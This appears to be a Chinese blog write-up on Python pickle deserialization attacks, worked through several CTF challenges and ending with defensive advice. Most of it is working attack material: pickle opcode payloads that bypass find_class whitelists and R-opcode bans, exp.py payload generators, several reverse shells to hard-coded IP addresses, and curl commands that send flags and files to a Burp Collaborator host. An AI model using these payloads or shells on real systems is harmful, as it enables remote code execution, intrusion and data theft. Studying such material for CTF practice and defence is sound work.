![image-20210811220348086](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png)

这次的白名单是`structs`，然鹅这是个空的模块 虚晃一枪。不过是空的不要紧，照样有内置方法。

![image-20210811220801646](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png)

`__builtins__`是所有模块公有的字典，记录所有的内建函数，可以通过对`__builtins__`内相应的键来修改对应的函数，上图中我们找到了eval方法，但取出eval这个键另外需要一个get方法才能做到。

我们知道，`__getattribute__`魔术方法可以访问任意属性。而同时`__import__`并不是铁板一块，它的全部参数是`__import__(name, globals=None, locals=None, fromlist=(), level=0)`，它可以被替换（通过导入builtins模块并赋值给`builtins.__import__`）来可以修改import语句的语义并且不会导致代码问题，而题目中重写的find_class()特地在getattr()之前调用了`__import__`，现在我们可以劫持这个__import__，让它变为`__getattribute__`，让我们引入的structs变为`structs.__getattribute__(structs).xxx`。

对于引入模块的检查只会出现在b'c'时，所以我们在用`S`操作码劫持`__import__`时并不会引发find_class()的过滤。

然而我们不能直接getattr()=getattr()这样覆盖`__import__`，我们还需要`__dict__`的帮忙。`__dict__`是一个列表，存储并决定了一个对象的所有属性，如果它的内容被改变，属性也会跟着改变。

所以整合一下上面的思路：我们先要引入助手list`structs.__dict__`，取出structs空模块的内建函数（一个待取的dict）`structs.__builtins__`和我们需要的魔术方法`structs.__getattribute__`。之后从内建函数`structs.__builtins__`中将键名为`__import__`的值替换为`structs.__getattribute__`，然后借助`__dict__`将structs的structs属性覆盖为修改后的内建函数。这时，我们再次用b'c'从structs中引入get时触发find_class()中的`__import__`，也就相当于在执行`structs.__getattribute__('structs').get`，这样我们就拿到了get方法。而之前我们又已经替换了structs属性为内建函数`__builtins__`，所以利用这个得到的get方法就可以从`__builtins__`中取出eval，执行代码了。之后执行代码的部分同上面的sys.modules的思路。

pker

```python
__dict__ = GLOBAL('structs', '__dict__')
__builtins__ = GLOBAL('structs', '__builtins__')
gtat = GLOBAL('structs', '__getattribute__')
__builtins__['__import__'] = gtat
__dict__['structs'] = __builtins__
builtin_get = GLOBAL('structs', 'get')
eval = builtin_get('eval')
eval('pickle.sys.modules['os'].system('cat ../flag.txt')')
return
```

opcode

```
b"cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR."
```
{{% /spoiler %}}

### 禁止`b'R'`操作码

也就相当于不可以用`__reduce__`，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用`b'i'`，`b'i'`，`b'b'`这些操作码来rce。

### -->>变量覆盖

{{% spoiler "栗子7 - [高校战“疫”网络安全分享赛2020] webtmp" %}}
（这个题是缝合的[SJTU 2019]Pickle 以及 [SJTU 2019]Pickle-Revenge的题 = =。限制了`R`操作码，同时重写`find_class()`限制引入模块为`__main__`，两个考点）

```python
import base64
import io
import sys
import pickle

from flask import Flask, Response, render_template, request
import secret


app = Flask(__name__)


class Animal:
    def __init__(self, name, category):
        self.name = name
        self.category = category

    def __repr__(self):
        return f'Animal(name={self.name!r}, category={self.category!r})'

    def __eq__(self, other):
        return type(other) is Animal and self.name == other.name and self.category == other.category


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__':
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))


def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()


def read(filename, encoding='utf-8'):
    with open(filename, 'r', encoding=encoding) as fin:
        return fin.read()


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.args.get('source'):
        return Response(read(__file__), mimetype='text/plain')

    if request.method == 'POST':
        try:
            pickle_data = request.form.get('data')
            if b'R' in base64.b64decode(pickle_data):
                return 'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'
            else:
                result = restricted_loads(base64.b64decode(pickle_data))
                if type(result) is not Animal:
                    return 'Are you sure that is an animal???'
            correct = (result == Animal(secret.name, secret.category))
            return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct)
        except Exception as e:
            print(repr(e))
            return "Something wrong"

    sample_obj = Animal('一给我哩giaogiao', 'Giao')
    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()
    return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

看源码，opcode部分ban掉了`R`操作码（调用一个callable对象），不能用`__reduce__`了；也重写了`find_class()`，module必须是`__main__`；我们的目标是

`restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)`为真，即correct==True

这里我们通过加载`__main__.secret`可以引入secret模块，来把`secret.name`和`secret.category`这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）

pker

```python
secret = GLOBAL('__main__', 'secret')
secret.name = 'frieggs'
secret.category = 'frieggs'
animal = INST('__main__', 'Animal', 'frieggs', 'frieggs')
return animal
# b"c__main__\nsecret\np0\n0g0\n(}(S'name'\nS'frieggs'\ndtbg0\n(}(S'category'\nS'frieggs'\ndtb(S'frieggs'\nS'frieggs'\ni__main__\nAnimal\np3\n0g3\n."
```

或者构造的exp.py

```python
import pickle

class Animal:
    def __init__(self, name, category):
        self.name = name
        self.category = category

    def __repr__(self):
        return f'Animal(name={self.name!r}, category={self.category!r})'

    def __eq__(self, other):
        return type(other) is Animal and self.name == other.name and self.category == other.category

print(pickle.dumps(Animal(name="x", category="y"), protocol=3))
# b'\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.'
```

————所以在不允许`b'R'`的情况下，思路则是篡改secret中的name和categoriy，单纯的用`b'c'`引入模块对Animal进行实例化，这一过程也相当于是执行了函数
{{% /spoiler %}}

一种解决办法就是这个栗子中的，干脆就不rce，而是用`b'c'`变量覆盖，思路就是上个三级标题下面的那个大段，不再赘述。

### -->>使用`__setstate__`&`b'b'`实现rce

另一种方式是用BUILD指令`b'b'`及进行rce。

在pickle源码中BUILD指令是这样的

![img](https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg)

如果一个实例inst拥有`__setstate__`方法，则把`state`交给`__setstate__`方法来处理；否则直接把`state`这个`dist`的内容合并到`inst.__dict__ `内。

如果一个类原本没有`__setstate__`这个方法，当我们用`{'__setstate__': os.system}`来BUILD这个对象，那么现在对象的`__setstate__`就变成了`os.system`；接下来利用`"ls /"`来再次BUILD这个对象，则会执行`setstate("ls /")` ，而此时`__setstate__`已经被我们设置为`os.system`，因此实现了rce

```python
import pickle
import os
class Student():
    def __init__(self):
        self.name = 'amelia'
        self.grade = 'A1'
payload = b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'
# shell = b"""\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS'bash -c "bash -i >& /dev/tcp/192.168.31.29/8426 0>&1"'\nb."""
pickle.loads(payload)
```

![image-20210810025215320](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png)

![image-20210810025143114](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png)

可以看到成功做到了rce~~反弹shell当然也可以

### -->>使用`_instantiate()`&`load_obj()`&`load_inst()`&`b'o'`&`b'i'`实现rce

- `_instantiate()`: Create a new object via klass(*args); Leads to arbitrary function call actually

  - ```python
    def _instantiate(self, klass, args):
        if (args or not isinstance(klass, type) or
            hasattr(klass, "__getinitargs__")):
            try:
                # Arbitrary function all
                value = klass(*args)
            except TypeError as err:
                raise TypeError("in constructor for %s: %s" %
                                (klass.__name__, str(err)), sys.exc_info()[2])
        else:
            value = klass.__new__(klass)
        self.append(value)
    ```

- `load_obj()`

  - ```python
    def load_obj(self):
        # Stack is ... markobject classobject arg1 arg2 ...
        args = self.pop_mark()
        cls = args.pop(0)
        self._instantiate(cls, args)
    dispatch[OBJ[0]] = load_obj
    ```

- `load_inst()`

  - ```python
    def load_inst(self):
        # read from user input
        module = self.readline()[:-1].decode("ascii")
        name = self.readline()[:-1].decode("ascii")
        klass = self.find_class(module, name)
        # get args from stack
        args = self.pop_mark()
        self._instantiate(klass, args)
    dispatch[INST[0]] = load_inst
    ```

exp.py

```python
import pickle
import struct
import base64

def exploit(command):
    assert type(command) is list
    payload_prefix = b'''(('''
    payload_suffix = b'''lisubprocess\nPopen\n.'''
    payload_body = bytes()
    for c in command:
        payload_body += b"X" + bytes(struct.pack("<I", len(c))) + bytes(c, encoding="utf-8")
    payload = payload_prefix + payload_body + payload_suffix
    assert b'R' not in payload
    return payload

def main():
    payload = exploit([
        "python",
        "-c",
        "print('pwned!')"
    ])
    print("Payload:", payload)
    print("Length:", len(payload))
    print("Base64:", base64.b64encode(payload))
    x = pickle.loads(payload)
    print(x)

if __name__ == "__main__":
    main()
```

```python
# 反弹shell当然也可 都说了是rce了
import sys,socket,os,pty
s=socket.socket()
s.connect(("182.92.191.192",50000))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

payload = exploit([
    "python",
    "-c",
    'import sys,socket,os,pty;s=socket.socket();s.connect(("8.8.8.8", 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")',
])
```

{{% spoiler "栗子8 - [巅峰极客 2021]opcode" %}}

首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码

![image-20211024145247073](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png)

第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的`session['data']`处

但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法<u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写`pickle.loads`方法，只是个摆设</u>，相当于仅对R操作码进行了限制，笑嘻了

直接上`eval()`+`b'o'`来弹shell了，不多bb

```python
(cbuiltins
eval
S'__import__("os").system(\'bash -c "bash -i >& /dev/tcp/101.35.113.107/8426 0&1"\')'
o.
```

或者是用`system()`+`curl`+`b'o'`外带flag

```python
(cos
system
S'curl burp_collaborator.net/?flag=`app/readflag`'
o.
```

然后生成b64的内容（用`'''`的好处是不用考虑太多引号转义的问题

```python
import base64
data = b'''xxxxxxxxxxxxxx'''
print(base64.b64encode(data))
```

cookie的生成就是flask_session_cookie_manager一把梭了

```bash
$ python3 flask_session_cookie_manager3.py encode -s 'y0u-wi11_neuer_kn0vv-!@#se%32' -t '{"data": "xxxxb64_contentxxxx", "username": "adminadmin"}' 
```

————如果按照题目原有的意思，限制`builtins`+`b'R'`操作码也是很好做出来的

先用pker生成带R的opcode

```python
getattr = GLOBAL('builtins', 'getattr')
dict = GLOBAL('builtins', 'dict')
dict_get = getattr(dict, 'get')
globals = GLOBAL('builtins', 'globals')
builtins = globals()
__builtins__ = dict_get(builtins, '__builtins__')
eval = getattr(__builtins__, 'eval')
eval('__import__("os").system("whoami")')
return
# b'cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\'get\'\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\'__builtins__\'\ntRp5\n0g0\n(g5\nS\'eval\'\ntRp6\n0g6\n(S\'__import__("os").system("whoami")\'\ntR.'
```

然后手搓，在调用callable前添加MARK即`(`，去掉`t`和调用`t`用到的MARK

也就是`[callable] [tuple] R===>MARK [callable] [args...] o`

```
b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__("os").system("whoami")'\no.'''
```

可以看下区别

![image-20211024165337816](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png)

修改都是一对一对的，**总结一下方法就是`0gx`要变为`0(gx`，`(gx`要变为`gx` ，`tR`换成`o`**

参考：[wp](https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6)

{{% /spoiler %}}

### -->>使用`_getattribute()`&`load_obj()`&`load_inst()`实现任意文件读取

- `find_class()`

  - ```python
    def find_class(self, module, name):
        # Subclasses may override this.
        sys.audit('pickle.find_class', module, name)
        if self.proto < 3 and self.fix_imports:
            if (module, name) in _compat_pickle.NAME_MAPPING:
                module, name = _compat_pickle.NAME_MAPPING[(module, name)]
            elif module in _compat_pickle.IMPORT_MAPPING:
                module = _compat_pickle.IMPORT_MAPPING[module]
        __import__(module, level=0)
        if self.proto >= 4:
            return _getattribute(sys.modules[module], name)[0]
        else:
            return getattr(sys.modules[module], name)
    ```

- `_getattribute()`

  - ```python
    def _getattribute(obj, name):
        for subpath in name.split('.'):
            if subpath == '<locals>':
                raise AttributeError("Can't get local attribute {!r} on {!r}"
                                     .format(name, obj))
            try:
                parent = obj
                obj = getattr(obj, subpath)
            except AttributeError:
                raise AttributeError("Can't get attribute {!r} on {!r}"
                                     .format(name, obj)) from None
        return obj, parent
    ```

- `read()`

  - ```python
    def read(filename, encoding='utf-8'):
        with open(filename, 'r', encoding=encoding) as fin:
            return fin.read()
    ```

仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值

exp.py

```python
import pickle
import struct
import base64

def read(filename, encoding='utf-8'):
    with open(filename, 'r', encoding=encoding) as fin:
        return fin.read()

def exploit(filename):
    payload_prefix = b'''('''
    payload_body = b"X" + bytes(struct.pack("<I", len(filename))) + bytes(filename, encoding="utf-8")
    payload_suffix = b'''i__main__\nread\n.'''
    payload = payload_prefix + payload_body + payload_suffix
    assert b'R' not in payload
    return payload

def main():
    payload = exploit("flag")
    print("Payload:", payload)
# b'(X\x04\x00\x00\x00flagi__main__\nread\n.'
    print("Length:", len(payload))
    print("Base64:", base64.b64encode(payload))

if __name__ == "__main__":
    main()
```

![image-20210811193545692](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png)

再把这一部分的payload缝合到创建Animal实例的Opcode中去

```python
# 原: name='x',category='y'
b'\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.'
# 缝合 应该能看出来改在哪里了
b'\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03(X\x04\x00\x00\x00flagi__main__\nread\nq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.'
```

![image-20210811195932427](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png)

## 一些小技巧&注意事项

- 当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A
- 对payload进行b64加密时，注意别把\n给单独编码了（不过正常都不会）
- 其他模块的load也可以触发pickle反序列化漏洞

例如：`numpy.load()`先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；`pandas.read_pickle()`直接使用`pickle.load()`方法

- 灵活运用<u>**burp collaborator**</u>

虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：[curl 的用法指南](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html)

```python
# 基操1
os.system('curl http://xxxx.burpcollaborator.net/`ls / | base64`)
# 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST
os.system('curl -d '@/flag.txt' http://xxxx.burpcollaborator.net/)
```

### 最后，出于安全角度的考量

- 禁用pickle，使用Json或Google Protocol Buffers

- 当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写`find_class()`（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名

- 举一个hmac的栗子

  ```python
  import hmac
  import pickle
  import base64
  
  class Student:
      def __init__(self, name, age):
          self.name = name
          self.age = age
  
      def __str__(self):
          return "My name is %s, I am %d years old." % (
              self.name,
              self.age
          )
  
  class HMAC_Pickler:
      def __init__(self, secret_key, seperator="|"):
          self.secret_key = secret_key
          self.seperator = seperator
  
      def digital_signature(self, data):
          signer = hmac.new(self.secret_key)
          signer.update(data)
          return signer.hexdigest()
  
      def loads(self, data):
          sign = data[:32]
          p = data[32+len(self.seperator):]
          assert sign == self.digital_signature(p), ("Data is tampered by someone.")
          return pickle.loads(p)
  
      def dumps(self, obj):
          p = pickle.dumps(obj)
          sign = self.digital_signature(p)
          return "%s%s%s" % (sign, self.seperator, p)
      def main():
      SECRET_KEY = b'7f54a0ab-6443-457c-ba20-2510ebbfb28f'
      pickler = HMAC_Pickler(SECRET_KEY)
  
      obj = Student("Jack", 19)
      print(obj)
  
      p = pickler.dumps(obj)
      print(p)
  
      o = pickler.loads(p)
      print(o)
  
      p += "I am hacker, trying evil things"
  
      x = pickler.loads(p)
      print(x)
  
  if __name__ == "__main__":
      main()
  ```

{{% spoiler "栗子9 - [BalsnCTF 2019] Pyshv3" %}}
这次的find_class()没有变化，但是structs有具体的实现

![image-20210812012841569](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png)

同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回

![image-20210812013032487](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png)

而这个self.user.privileged在一开始就被设为了False

![image-20210812013115089](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png)

emmmm 这怎么绕过捏？

先说非预期，将`__builtins__`复制到modules属性上；再说说预期解。

我们知道，有`__get__`，`__set__`这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，`a.x`的查找顺序是`a.__dict__['x']`，之后`type(a).__dict__['x']`，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：[什么是描述符（descriptor）](https://foofish.net/what-is-descriptor-in-python.html)）

我们利用描述器的特性，将User类的`__set__`方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发`__set__`，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。

pker

```python
User = GLOBAL('structs', 'User')
User.__set__ = GLOBAL('structs', 'User')
user = User(0, 0)
User.privileged = user
return user
```

opcode

```
b"cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n."
```
{{% /spoiler %}}

考虑到这个题更综合了python的相关特性，所以把这个题放在最后。

------

从新建文件到写完用了几天时间，细细地整理相关知识，也算是对反序列化这个知识点的认识清晰了不少。还有一个PyYAML的反序列化问题，由于篇幅问题拆开来放到下一篇中。自认为总结的还是比较详细的（嘿嘿x）不过肯定还有不周到的地方，之后如遇到更多知识还会进行补充。

自己还是有惰性啊，其实反序列化第一篇总结的是php，可是到现在还有几个二级标题下面是空白的……只能先给自己找个借口：php反序列化的东西实在是太多了TAT

------

最后放一下全篇用到的的参考文章（部分已写在对应标题下面），不分先后~

[Python 反序列化漏洞学习笔记](https://www.cnblogs.com/wjrblogs/p/14057784.html)  |  [一篇文章带你理解漏洞之 Python 反序列化漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  |  [pickle反序列化初探](https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2)  |  [Python pickle 反序列化实例分析](https://www.anquanke.com/post/id/188981#h2-10)  |  [Python 反序列化安全问题（一）](https://segmentfault.com/a/1190000013099825) - [Python 反序列化安全问题（二）](https://segmentfault.com/a/1190000013214956)  |  [从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://zhuanlan.zhihu.com/p/89132768)  |  [关于Python sec的一些简单的总结](https://blog.csdn.net/weixin_39929635/article/details/111003485)  |  [Sour Pickles  A serialised exploitation guide in one part - Macro Slaviero](https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)  |  [🐍 Security Issues in Python Pickle](https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX#)

